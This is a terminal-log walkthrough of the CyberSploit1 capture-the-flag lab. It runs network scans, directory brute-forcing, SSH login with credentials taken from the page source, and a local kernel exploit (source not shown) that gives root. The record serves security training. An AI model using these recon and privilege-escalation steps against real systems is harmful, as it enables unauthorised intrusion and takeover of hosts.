root@Blue3:~# nmap -sn 192.168.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:08 +07
Nmap scan report for 192.168.1.1
Host is up (0.00060s latency).
MAC Address: 9C:65:EE:C6:DD:37 (Dasan Network Solutions)
Nmap scan report for 192.168.1.2
Host is up (0.079s latency).
MAC Address: 44:23:7C:A9:58:5E (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.1.5
Host is up (0.0043s latency).
MAC Address: 00:0C:29:72:F2:B8 (VMware)
Nmap scan report for 192.168.1.32
Host is up (0.0015s latency).
MAC Address: 70:85:C2:CB:87:4D (ASRock Incorporation)
Nmap scan report for 192.168.1.4
Host is up.
Nmap scan report for 192.168.1.35
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 35.91 seconds

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

root@Blue3:~# nmap -sV -sC -A -O -p- 192.168.1.5
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:28 +07
Nmap scan report for 192.168.1.5
Host is up (0.00059s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
MAC Address: 00:0C:29:72:F2:B8 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 192.168.1.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.63 seconds

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

root@Blue3:~# nano /etc/hosts
  GNU nano 4.9.3                                                                                  /etc/hosts
127.0.0.1       Blue3    localhost
192.168.1.5     cybersploit1
::1             localhost ip6-localhost ip6-loopback
fe00::0         ip6-localnet
ff00::0         ip6-mcastprefix
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

                                                  Access the web
                                                  GOT the webpage as cybersploit1-1.jpeg

root@Blue3:~# curl -X GET http://cybersploit1
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <title>Hello Pentester!</title>
  </head>
  <body>
    <h1>Welcome To CyBeRSplOiT-CTF </h1>
<nav class="navbar navbar-expand-lg navbar-light bg-dark">
  <a class="navbar-brand" href="#">Home</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="navbarNav">
    <ul class="navbar-nav">
      <li class="nav-item active">
        <a class="nav-link" href="#">Pentester<span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Web Developer</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Android Developer</a>
      </li>
          </ul>
  </div>
</nav>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<pre>           <img src="hacker.gif" class="img-fluid" alt="hacker">
</pre>
<pre>
<h4>                           LOL ! hahahhahahhahaha..............<h4>
                                                   <h5> You should try something more ! <h5>
</pre>



<!-------------username:itsskv--------------------->
</body>
</html>

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

                                                  Got the "username": itsskv
                                                  Let's check more information on webpages

root@Blue3:~# gobuster dir --url=http://cybersploit1 -w /root/Wordlists/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cybersploit1
[+] Threads:        10
[+] Wordlist:       /root/Wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/26 17:52:03 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/index (Status: 200)
/index.html (Status: 200)
/hacker (Status: 200)
/robots.txt (Status: 200)
/robots (Status: 200)
/server-status (Status: 403)
===============================================================
2020/07/26 17:52:05 Finished
===============================================================

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

root@Blue3:~# curl -X GET http://cybersploit1/robots.txt
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

root@Blue3:~# curl -X GET http://cybersploit1/robots.txt | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    79  100    79    0     0  39500      0 --:--:-- --:--:-- --:--:-- 39500
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}base64: invalid input

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

                                                  WE GOT THE FLAG 1: cybersploit{youtube.com/c/cybersploit}
                                                  SSH with credential: itsskv / cybersploit{youtube.com/c/cybersploit}

root@Blue3:~# ssh itsskv@cybersploit1
itsskv@cybersploit1's password:
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

332 packages can be updated.
273 updates are security updates.

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

Last login: Sat Jun 27 10:14:39 2020 from cybersploit.local
itsskv@cybersploit-CTF:~$ ls -ltra
total 156
drwxr-xr-x  4 root   root    4096 Jun 25 12:11 ..
-rw-r--r--  1 itsskv itsskv   675 Jun 25 12:11 .profile
-rw-r--r--  1 itsskv itsskv  8445 Jun 25 12:11 examples.desktop
-rw-r--r--  1 itsskv itsskv  3486 Jun 25 12:11 .bashrc
-rw-r--r--  1 itsskv itsskv   220 Jun 25 12:11 .bash_logout
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Videos
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Templates
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Public
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Pictures
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Music
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Downloads
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Documents
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Desktop
drwx------  3 itsskv itsskv  4096 Jun 25 19:04 .dbus
drwx------  2 itsskv itsskv  4096 Jun 25 19:04 .gvfs
drwxr-xr-x  3 itsskv itsskv  4096 Jun 25 19:04 .local
-rw-------  1 itsskv itsskv   256 Jun 25 19:04 .pulse-cookie
drwx------  4 itsskv itsskv  4096 Jun 25 19:04 .gnome2
drwx------  3 itsskv itsskv  4096 Jun 25 19:04 .mission-control
drwx------  9 itsskv itsskv  4096 Jun 25 19:05 .config
drwx------  4 itsskv itsskv  4096 Jun 25 19:06 .mozilla
drwx------ 14 itsskv itsskv  4096 Jun 25 19:34 .cache
-rw-------  1 itsskv itsskv 13525 Jun 26 15:14 .xsession-errors.old
-rw-r--r--  1 itsskv itsskv    25 Jun 26 23:32 .dmrc
-rw-------  1 itsskv itsskv  1062 Jun 26 23:32 .ICEauthority
drwx------  2 itsskv itsskv  4096 Jun 26 23:32 .pulse
drwx------  3 itsskv itsskv  4096 Jun 26 23:32 .gconf
-rw-rw-r--  1 itsskv itsskv   142 Jun 26 23:32 .gtk-bookmarks
-rw-------  1 itsskv itsskv     0 Jun 26 23:36 .Xauthority
-rw-------  1 itsskv itsskv 12288 Jun 26 23:36 .xsession-errors
drwxr-xr-x 20 itsskv itsskv  4096 Jun 27 10:00 .
-rw-rw-r--  1 itsskv itsskv   495 Jun 27 10:03 flag2.txt
-rw-------  1 itsskv itsskv   233 Jun 27 10:12 .bash_history
itsskv@cybersploit-CTF:~$ cat flag2.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101

                                                  Using CyberChef or whatever tool you like to convert Binary to String (cybersploit1-2.jpeg)
OUTPUT:
good work !
flag2: cybersploit{https:t.me/cybersploit1}

# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #

                                                  After looking around alot
itsskv@cybersploit-CTF:~$ uname -r
3.13.0-32-generic
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
itsskv@cybersploit-CTF:~$ nano exploit.c
itsskv@cybersploit-CTF:~$ gcc exploit.c -o exploit.c
itsskv@cybersploit-CTF:~$ ./exploit.c
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
#
# whoami
root
# ls -ltra
total 168
drwxr-xr-x  4 root   root    4096 Jun 25 12:11 ..
-rw-r--r--  1 itsskv itsskv  8445 Jun 25 12:11 examples.desktop
-rw-r--r--  1 itsskv itsskv   675 Jun 25 12:11 .profile
-rw-r--r--  1 itsskv itsskv  3486 Jun 25 12:11 .bashrc
-rw-r--r--  1 itsskv itsskv   220 Jun 25 12:11 .bash_logout
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Videos
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Templates
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Public
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Pictures
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Music
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Downloads
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Documents
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25 19:04 Desktop
drwx------  3 itsskv itsskv  4096 Jun 25 19:04 .dbus
drwx------  2 itsskv itsskv  4096 Jun 25 19:04 .gvfs
drwxr-xr-x  3 itsskv itsskv  4096 Jun 25 19:04 .local
-rw-------  1 itsskv itsskv   256 Jun 25 19:04 .pulse-cookie
drwx------  4 itsskv itsskv  4096 Jun 25 19:04 .gnome2
drwx------  3 itsskv itsskv  4096 Jun 25 19:04 .mission-control
drwx------  9 itsskv itsskv  4096 Jun 25 19:05 .config
drwx------  4 itsskv itsskv  4096 Jun 25 19:06 .mozilla
drwx------ 14 itsskv itsskv  4096 Jun 25 19:34 .cache
-rw-------  1 itsskv itsskv 13525 Jun 26 15:14 .xsession-errors.old
-rw-r--r--  1 itsskv itsskv    25 Jun 26 23:32 .dmrc
-rw-------  1 itsskv itsskv  1062 Jun 26 23:32 .ICEauthority
drwx------  2 itsskv itsskv  4096 Jun 26 23:32 .pulse
drwx------  3 itsskv itsskv  4096 Jun 26 23:32 .gconf
-rw-rw-r--  1 itsskv itsskv   142 Jun 26 23:32 .gtk-bookmarks
-rw-------  1 itsskv itsskv     0 Jun 26 23:36 .Xauthority
-rw-------  1 itsskv itsskv 12288 Jun 26 23:36 .xsession-errors
-rw-rw-r--  1 itsskv itsskv   495 Jun 27 10:03 flag2.txt
-rw-------  1 itsskv itsskv   261 Jul 26 16:30 .bash_history
drwxr-xr-x 20 itsskv itsskv  4096 Jul 26 22:17 .
-rwxrwxr-x  1 itsskv itsskv 12018 Jul 26 22:17 exploit.c
# cd /root/
# ls -ltra
total 40
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwxr-xr-x 23 root root 4096 Jun 25 11:42 ..
-rw-------  1 root root  256 Jun 25 11:50 .pulse-cookie
drwx------  3 root root 4096 Jun 27 09:29 .cache
drwx------  3 root root 4096 Jun 27 09:29 .dbus
drwx------  5 root root 4096 Jun 27 10:07 .
-rw-r--r--  1 root root 1193 Jun 27 10:12 finalflag.txt
-rw-------  1 root root  705 Jun 27 10:17 .bash_history
drwx------  2 root root 4096 Jun 27 10:20 .pulse
# cat finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|


   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
if you like it share with me https://twitter.com/cybersploit1.
Thanks !
